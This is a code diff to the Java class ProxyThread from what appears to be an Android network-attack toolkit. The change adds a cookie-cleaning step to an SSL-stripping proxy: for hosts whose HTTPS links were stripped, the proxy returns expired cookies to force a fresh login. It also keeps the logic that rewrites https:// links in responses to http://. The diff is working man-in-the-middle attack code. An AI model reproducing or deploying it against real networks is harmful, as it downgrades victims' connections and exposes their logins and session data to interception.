@@ -142,10 +142,10 @@ public class ProxyThread extends Thread
 	            // any real host found ?
 	 			if( mServerName != null )
 	 			{			
-	 				String request = builder.toString(),	 							 
-	 		  			   url     = RequestParser.getUrlFromRequest( mServerName, request );	 				
-	 				
-	 				boolean https  = false;
+	 				String request  = builder.toString(),	 							 
+	 		  			   url      = RequestParser.getUrlFromRequest( mServerName, request ),
+	 		  			   response = null;
+	 				boolean https   = false;
 	 				
 	 				// connect to host
         			if( mHostRedirect == null )			
@@ -153,6 +153,15 @@ public class ProxyThread extends Thread
         				if( url != null && HTTPSMonitor.getInstance().hasURL( client, url ) == true )
         				{        					
         					Log.w( TAG, "Found stripped HTTPS url : " + url );
+        					
+        					if( CookieCleaner.getInstance().isClean( client, mServerName, request ) == false )
+        					{
+        						Log.w( TAG, "Sending expired cookie for " + mServerName );
+        						
+        						response = CookieCleaner.getInstance().getExpiredResponse( request, mServerName );
+        						
+        						CookieCleaner.getInstance().addCleaned( client, mServerName );
+        					}
         					
         					https   = true;
         					mServer = mSocketFactory.createSocket( mServerName, HTTPS_SERVER_PORT );
@@ -163,49 +172,56 @@ public class ProxyThread extends Thread
         			// just redirect requests
         			else
         				mServer = new Socket( mServerName, mPortRedirect );
-        			
-					mServerReader = mServer.getInputStream(); 
-					mServerWriter = mServer.getOutputStream();		
-					
-					Log.d( TAG, client + " > " + mServerName );
-					
+        											
 	 				if( mRequestListener != null )
 	            		mRequestListener.onRequest( https, client, mServerName, headers );
 	 				
-	 				// send the patched request
-	 				mServerWriter.write( request.getBytes() );
-	 				mServerWriter.flush();
-	 				// start the stream session with specified filters				
-	 				new StreamThread( client, mServerReader, mWriter, new Proxy.ProxyFilter() {									
-	 					@Override
-	 					public String onDataReceived( String headers, String data ) 
-	 					{	
-	 						// first of all, get rid of every HTTPS url
-	 						Matcher match = LINK_PATTERN.matcher( data );
-	 						if( match != null )
-	 						{
-	 							while( match.find() )
-	 							{
-	 								String url 		= match.group( 1 ),
-	 									   stripped = url.replace( "https://", "http://" ).replace( "&amp;", "&" );
-	 								
-	 								Log.w( TAG, "Stripping HTTPS url : " + url );
-	 								
-	 								data = data.replace( url, stripped );
-	 								
-	 								HTTPSMonitor.getInstance().addURL( client, stripped );
-	 							}
-	 						}
-	 						
-	 						// apply each provided filter
-	 						for( Proxy.ProxyFilter filter : mFilters )
-	 						{
-	 							data = filter.onDataReceived( headers, data );
-	 						}
-	 						
-	 						return data;
-	 					}
-	 				});
+	 				if( response != null )
+	 				{	 					
+	 					mWriter.write( response.getBytes() );
+	 					mWriter.flush();
+	 					mWriter.close();
+	 				}
+	 				else
+	 				{
+	 					mServerReader = mServer.getInputStream(); 
+						mServerWriter = mServer.getOutputStream();		
+						
+						Log.d( TAG, client + " > " + mServerName );
+						
+		 				// send the patched request
+		 				mServerWriter.write( request.getBytes() );
+		 				mServerWriter.flush();
+		 				// start the stream session with specified filters				
+		 				new StreamThread( client, mServerReader, mWriter, new Proxy.ProxyFilter() {									
+		 					@Override
+		 					public String onDataReceived( String headers, String data ) 
+		 					{	
+		 						// first of all, get rid of every HTTPS url
+		 						Matcher match = LINK_PATTERN.matcher( data );
+		 						if( match != null )
+		 						{
+		 							while( match.find() )
+		 							{
+		 								String url 		= match.group( 1 ),
+		 									   stripped = url.replace( "https://", "http://" ).replace( "&amp;", "&" );
+		 										 								
+		 								data = data.replace( url, stripped );
+		 								
+		 								HTTPSMonitor.getInstance().addURL( client, stripped );
+		 							}
+		 						}
+		 						
+		 						// apply each provided filter
+		 						for( Proxy.ProxyFilter filter : mFilters )
+		 						{
+		 							data = filter.onDataReceived( headers, data );
+		 						}
+		 						
+		 						return data;
+		 					}
+		 				});
+	 				}
 	 			}					
             }
             else
